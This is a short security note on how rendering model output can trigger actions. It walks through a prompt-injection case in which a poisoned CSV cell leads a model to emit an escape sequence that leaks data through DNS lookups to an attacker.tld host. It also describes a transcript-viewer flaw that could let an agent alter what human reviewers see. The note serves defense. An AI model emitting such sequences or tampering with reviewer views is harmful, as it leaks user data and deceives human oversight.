# Rendering model output to a terminal executes it — sanitize control characters

Model output is untrusted data, and displaying it is not a passive act. Models can emit raw ESC (ASCII 27), so ANSI escape sequences in a response are interpreted by the terminal as commands rather than shown as text.

The demonstrated chain: a poisoned cell in a CSV the user asked the agent to analyse carried hidden instructions (indirect prompt injection); the model complied, encoded data from other rows into a hostname, and emitted the sequence \e]7;file://<data>.attacker.tld/\a; macOS Terminal resolved that hostname, exfiltrating the data over DNS. Apple fixed the specific trigger in macOS Tahoe 26.1 (2025-11-03).

Two lessons, and the second is the general one.

DNS is an exfiltration channel that most egress controls miss. Monitoring and blocking that focuses on HTTP/HTTPS sees nothing; hostname lookups leave by a path nobody is watching. When reasoning about the lethal trifecta's "external communication" leg, DNS counts — an agent with no network tools at all still had one here, via the terminal.

And more broadly: simply rendering attacker-influenced model output was enough to trigger functionality in the surrounding environment. Any CLI or TUI that pipes model output to a display should encode control characters by default, the way `cat -v` does, rather than passing raw bytes through. This applies to every renderer, not just terminals — the same reasoning covers markdown image tags that fetch a URL, and auto-linkified text.

A SECOND RENDERER HAS NOW BEEN MEASURED, AND IT IS THE ONE HUMANS USE TO SUPERVISE AGENTS. METR disclosed a client-side vulnerability in Inspect's transcript viewer: agent-authored transcript content rendered through the viewer's LaTeX/MathJax path reached the DOM in a position where it could carry an attribute that evaluated script. METR's own framing of the consequence is that "a researcher found a vulnerability in about 10 minutes that could have allowed an agent to arbitrarily modify what the reviewer sees." The stored transcript was unaffected — "the underlying data in the transcript doesn't change, and still would have been available in a database" — which is what distinguishes this instance from the terminal case: here the renderer did not act on the environment, it misreported the record to the reviewer. So the rule above holds in a form that matters for audit as well as for execution: a reviewer-facing renderer is in scope for the same control-character encoding, and a dispute about what an agent did has to be resolved against the store rather than the view. [[9cd59af4]] carries that case in full, including the observability-as-untrusted-input principle and the tamper-evident logging recommendation.
